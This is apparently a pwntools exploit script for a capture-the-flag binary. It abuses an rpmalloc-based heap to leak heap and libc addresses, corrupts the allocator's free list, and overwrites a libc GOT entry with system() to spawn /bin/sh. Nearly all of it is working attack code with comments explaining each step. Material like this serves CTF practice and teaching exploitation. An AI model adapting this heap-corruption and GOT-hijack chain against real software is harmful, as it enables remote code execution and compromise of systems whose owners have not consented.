#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./org_chall_patched")

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Functions
def register(age: bytes, name: bytes, description: bytes):
    io.sendline(b"1")
    io.sendlineafter(b"hacker? ", age)
    io.sendlineafter(b"name ? ", name)
    io.sendlineafter(b"hacker ? ", description)
    io.recvuntil(b">> ")

def view(index: int):
    io.sendline(b"2")
    io.sendlineafter(b"number ? ", str(index).encode())
    io.recvuntil(b"Age: ")
    leak = io.recvline().strip()
    io.recvline()
    return leak

io = start()

register(b"+", b"A"*16, b"B"*16) # 0
register(b"+", b"A"*16, b";/bin/sh;\x00") # 1 # This will be the argument to system: AAAA;/bin/sh; when viewed

heap_leak = view(1)
heap_leak = int(heap_leak, 10) # Base 10 since we get it as a decimal (base 10, hex is base 16)
log.info("Heap leak: %s" % hex(heap_leak))
heap_base = heap_leak - 0xe0 # The offset of the chunk from heap base
log.info("Heap base %s" % hex(heap_base))

payload = p64(heap_base + 0x28) * 4 # Rpmalloc does not care a bout aligned chunks
register(b"+", b"A"*8, payload) # 2, 0x110

register(b"100", b"C"*8, b"D"*32) # 3 0x100 next (0x100 contains addr to 0x28)

register(b"+", b"E"*8, b"F"*8) # 4 0x28 next

# The next allocation will have address to heap main in it (at 'age'). This will tell us about heap main
# The address to heap main will also be written into the free_list because we purposely misaligned the heap
# This is because the place where 'age' is written contains the addres to the next chunck to be allocated
register(b"+", b"G"*8, b"H"*8) # 5, heap main next

heap_main_leak = view(5)
heap_main_leak = int(heap_main_leak, 10)
log.info("Heap main leak: %s" % hex(heap_main_leak))

# The heap main leak has an offset to libc and we can use that to calculate the base address of libc
heap_leak_off = 0
if args.HELLO:
    heap_leak_off = 0x3fa000
else:
    heap_leak_off = 0x2da000 # with aslr

log.info("Heap leak off: %s" % hex(heap_leak_off))

libc_base = heap_main_leak - heap_leak_off
log.info("Libc base: %s" % hex(libc_base))

# The free_list pointer is within the range of our next allocation in heap main which means that we can
# overwrite this pointer directly and control where the next allocation will be made.
# We will point the next allocation at __vfprintf_internal which is called when printf is used.
# Printf is used to view a hacker's profile.

abs_got_off = 0x21a080 # Used by vprintf_internal
system_off = 0x50d70

abs_got = libc_base + abs_got_off
system = libc_base + system_off

log.info("Abs.got: %s" % hex(abs_got))
log.info("System: %s" % hex(system))

# Allocate in heap main overwriting free_list directly, with the address of abs.got
payload = p64(abs_got)*4
#register(str(0xdeadbeef).encode(), b"X"*8, payload) # 6

# Allocate memory on abs.bot and write system addr to it
payload = p64(system)*4
register(str(0xdeadbeef).encode(), b"AAAA", payload) # 7

view(1) # Call system("AAAAAAA;/bin/sh;)

io.sendline(b"id")

io.interactive()
